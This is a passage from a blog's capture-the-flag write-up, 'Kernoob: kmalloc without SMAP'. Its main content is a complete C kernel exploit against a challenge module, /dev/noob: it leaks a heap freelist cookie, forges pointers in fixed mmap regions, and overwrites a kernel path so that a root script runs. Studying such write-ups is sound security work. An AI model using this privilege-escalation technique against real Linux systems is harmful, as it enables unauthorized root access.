class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNCALL __attribute__((regparm(3)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">long</span> <span class="keyword">int</span>  data[<span class="number">0x400</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">int</span> index,<span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> arg[<span class="number">3</span>]=&#123;index,<span class="number">0</span>,<span class="built_in">size</span>&#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x30000</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">int</span> index)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> arg[<span class="number">3</span>]=&#123;index,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">int</span> index,<span class="keyword">long</span> <span class="keyword">int</span> *data,<span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> arg[<span class="number">3</span>]=&#123;index,data,<span class="built_in">size</span>&#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x30002</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">long</span> <span class="keyword">int</span> index,<span class="keyword">long</span> <span class="keyword">int</span> *data,<span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">int</span> arg[<span class="number">3</span>]=&#123;index,data,<span class="built_in">size</span>&#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">14</span>;i++)&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"%016llx  |  %016llx\n"</span>,data[<span class="number">2</span>*i],data[<span class="number">2</span>*i+<span class="number">1</span>]);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_eflags,user_sp ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">        <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">        <span class="string">"movq %%rsp, %3\n"</span></span><br><span class="line">        <span class="string">"pushfq\n"</span></span><br><span class="line">        <span class="string">"popq %2\n"</span></span><br><span class="line">        :<span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_eflags),<span class="string">"=r"</span>(user_sp)</span><br><span class="line">        :</span><br><span class="line">        : <span class="string">"memory"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   save_status();</span><br><span class="line">   signal(SIGSEGV, shell);</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> mod_base= <span class="number">0xffffffffc0002000</span>;</span><br><span class="line">   <span class="keyword">int</span> fd=<span class="built_in">open</span>(<span class="string">"/dev/noob"</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> leak[<span class="number">2</span>];</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> address[<span class="number">2</span>];</span><br><span class="line">   <span class="keyword">int</span> j=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=<span class="number">20</span>;i++)&#123;</span><br><span class="line">   add(fd,i,<span class="number">0x60</span>);</span><br><span class="line">   show(fd,i,data,<span class="number">0x60</span>);</span><br><span class="line">   <span class="keyword">if</span>(data[<span class="number">5</span>]==data[<span class="number">6</span>] &amp;&amp; data[<span class="number">5</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%d=&gt;%llx\n"</span>,i,data[<span class="number">5</span>]);</span><br><span class="line">       leak[j]=i;</span><br><span class="line">       address[j++]=data[<span class="number">5</span>]<span class="number">-0x28</span>;</span><br><span class="line">       <span class="keyword">if</span>(j==<span class="number">2</span>)</span><br><span class="line">           <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>,leak[<span class="number">0</span>],leak[<span class="number">1</span>]);</span><br><span class="line">   <span class="keyword">delete</span>(fd,leak[<span class="number">0</span>]);</span><br><span class="line">   <span class="keyword">delete</span>(fd,leak[<span class="number">1</span>]);<span class="comment">//1-&gt;0</span></span><br><span class="line">   show(fd,leak[<span class="number">1</span>],data,<span class="number">0x60</span>);</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> c1=data[<span class="number">0</span>];</span><br><span class="line">   show(fd,leak[<span class="number">0</span>],data,<span class="number">0x60</span>);  </span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> c2=data[<span class="number">0</span>];</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> cookie=c1^address[<span class="number">0</span>]^address[<span class="number">1</span>];</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> cookie2=<span class="number">0xb34d695ef7afee8</span>;<span class="comment">//c2^address[0];</span></span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"cookie =&gt; %llx\n"</span>,cookie);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"cookie2 =&gt; %llx\n"</span>,cookie2);</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> kirin_magic=(cookie2^mod_base)&gt;&gt;<span class="number">32</span>;</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> fake=mmap(kirin_magic&amp;<span class="number">0xfffff000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%llx %llx\n"</span>,(kirin_magic)&amp;<span class="number">0xfffff000</span>,fake);</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> fake2=kirin_magic&amp;<span class="number">0xffffffff</span>;</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> magic2=(fake2&lt;&lt;<span class="number">32</span>)^cookie2^<span class="number">0xffffffffc000461c</span>;</span><br><span class="line">   <span class="keyword">long</span> <span class="keyword">int</span> fake3=mmap(magic2&amp;<span class="number">0xfffff000</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"2: %llx %llx\n"</span>,magic2,fake3);</span><br><span class="line">   *(<span class="keyword">long</span> <span class="keyword">int</span> *)magic2=magic2^cookie2;</span><br><span class="line">   data[<span class="number">0</span>]=cookie2^address[<span class="number">1</span>]^fake2;</span><br><span class="line">   *(<span class="keyword">long</span> <span class="keyword">int</span> *)fake2=cookie2^fake2;</span><br><span class="line">   edit(fd,leak[<span class="number">1</span>],data,<span class="number">8</span>);</span><br><span class="line">   add(fd,<span class="number">21</span>,<span class="number">0x60</span>);</span><br><span class="line">   *(<span class="keyword">long</span> <span class="keyword">int</span> *)fake2=cookie2^fake2^<span class="number">0xffffffffc000461c</span>;</span><br><span class="line">   add(fd,<span class="number">22</span>,<span class="number">0x60</span>);</span><br><span class="line">   add(fd,<span class="number">23</span>,<span class="number">0x60</span>);</span><br><span class="line">   add(fd,<span class="number">24</span>,<span class="number">0x60</span>);</span><br><span class="line">   add(fd,<span class="number">25</span>,<span class="number">0x60</span>);</span><br><span class="line">   data[<span class="number">0</span>]=<span class="number">0x8245aba000000000</span>;</span><br><span class="line">   data[<span class="number">1</span>]=<span class="number">0x00000060ffffffff</span>;</span><br><span class="line">   edit(fd,<span class="number">23</span>,data,<span class="number">0x10</span>);</span><br><span class="line">   data[<span class="number">0</span>]=<span class="number">0x68732e79706f632f</span>;</span><br><span class="line">   data[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">char</span> *copy=<span class="string">"/home/pwn/exp/copy.sh"</span>;</span><br><span class="line">   edit(fd,<span class="number">22</span>,copy,<span class="number">25</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<img src="https://upload-images.jianshu.io/upload_images/7434375-4f90bf4d73b2ef0a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Successfully"></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">2.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#cookie-leak"><span class="toc-number">2.1.</span> <span class="toc-text">cookie leak</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bypass-crash"><span class="toc-number">2.2.</span> <span class="toc-text">bypass crash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-flag"><span class="toc-number">2.3.</span> <span class="toc-text">get flag</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN"><span class="toc-number">3.</span> <span class="toc-text">PWN</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&text=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&title=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&is_video=false&description=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Kernoob: kmalloc without SMAP&body=Check out this article: http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&title=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&title=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&title=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&title=Kernoob: kmalloc without SMAP" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/03/10/Kernoob-kmalloc-without-SMAP/&name=Kernoob: kmalloc without SMAP&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 Kirin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
